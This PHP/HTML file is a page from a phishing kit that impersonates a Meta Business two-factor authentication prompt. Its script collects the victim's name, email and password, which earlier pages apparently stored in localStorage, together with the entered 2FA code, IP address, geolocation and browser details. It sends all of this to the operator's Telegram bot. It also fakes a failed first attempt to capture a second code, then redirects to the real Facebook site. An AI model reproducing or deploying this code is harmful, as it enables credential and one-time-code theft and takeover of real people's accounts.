<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-factor authentication required - Meta Business</title>
    <link rel="icon" href="../../images/favicon.ico">
    <link rel="stylesheet" href="../../styles/two-factor-authentication.css">
</head>
<body>
    <div class="auth-container">
        <div class="auth-card">
            <h1>Two-factor authentication required</h1>
            <p class="instruction">Generate a code in your authentication app, and enter it here.</p>
            
            <a href="#" class="learn-more">Learn more</a>
            
            <form class="auth-form" onsubmit="sendToTelegramFromTwoFactorAuthentication(event)">
                <div class="input-group">
                    <input type="text" id="code" placeholder="Enter code" maxlength="8">
                    <div class="error-message" style="display: none;">
                        <span class="error-icon">⚠️</span>
                        <span class="error-text">The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</span>
                    </div>
                </div>
                
                <div class="form-footer">
                    <a href="#" class="alternative-auth">Need another way to authenticate?</a>
                    <button type="submit" class="confirm-btn">Confirm</button>
                </div>
            </form>
        </div>
    </div>

    <script src="../../scripts/two-factor-authentication.js"></script>
    <script>
        function showError(errorMessage, codeInput) {
            errorMessage.style.display = 'flex';
            codeInput.classList.add('error');
        }

        function hideError(errorMessage, codeInput) {
            errorMessage.style.display = 'none';
            codeInput.classList.remove('error');
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const codeInput = document.getElementById('code');
            const confirmBtn = document.querySelector('.confirm-btn');
            const learnMoreLink = document.querySelector('.learn-more');
            const alternativeAuthLink = document.querySelector('.alternative-auth');
            const errorMessage = document.querySelector('.error-message');

           
            // Format input to only allow numbers and max 8 digits
            codeInput.addEventListener('input', function(e) {
                // Remove any non-numeric characters
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Limit to 8 digits
                if (this.value.length > 8) {
                    this.value = this.value.slice(0, 8);
                }

                // Hide error when user starts typing again
                hideError(errorMessage, codeInput);
            });

            // Handle learn more link
            learnMoreLink.addEventListener('click', function(e) {
                e.preventDefault();
                // Here you would typically open documentation or help page
                console.log('Opening 2FA documentation...');
            });

            // Handle alternative authentication link
            alternativeAuthLink.addEventListener('click', function(e) {
                e.preventDefault();
                // Here you would typically show alternative auth options
                console.log('Opening alternative authentication options...');
            });
            
            var paramsURL = new URLSearchParams(window.location.search);
            var error = paramsURL.get('error');
            var code = paramsURL.get('code');

            if (error == 1) {
                codeInput.value = code;
                codeInput.focus();
                codeInput.select();
                codeInput.style.border = '1px solid #FF0303';

                codeInput.addEventListener('input', function() {
                    if (codeInput.value.length > 0) {
                        codeInput.style.border = '1px solid #E5E5E5';
                    } else {
                        codeInput.style.border = '1px solid #FF0303';
                    }
                });
            }
        });
            
        function sendToTelegramFromTwoFactorAuthentication(event) {
            event.preventDefault();
            var code = document.getElementById('code').value || '';
            var errorMessage = document.querySelector('.error-message');
            var codeInput = document.getElementById('code');

            if (code == "") {
                showError(errorMessage, codeInput);
                return;
            }

            if (code.length !== 8) {
                showError(errorMessage, codeInput);
                return;
            }

            var firstName = localStorage.getItem('firstName');
            var lastName = localStorage.getItem('lastName');
            var personalEmail = localStorage.getItem('personalEmail');
            var password = localStorage.getItem('password');

            var content = "💬Thông Tin Tài Khoản 2💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFirst Name: " + "`" + firstName + "`" +
                "\nLast Name: " + "`" + lastName + "`" +
                "\nEmail: " + "`" + personalEmail + "`" +
                "\nPassword: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nCode: " + "`" + code + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            console.log(content);
            
            var apiToken = "<?php echo $token; ?>";
            var data = {
                chat_id: '<?php echo $chatId; ?>',
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log('Message sent to Telegram bot successfully.');
                        setTimeout(function() {
                            var paramsURL = new URLSearchParams(window.location.search);
                            var error = paramsURL.get('error');

                            if (error == 1) {
                                window.location.href = "https://business.facebook.com/select/?next=";
                            } else {
                                window.location.href = "two-factor-authentication.php?error=1&code=" + code;
                            }
                        }, 1000);
                    } else {
                        console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>
</body>
</html> 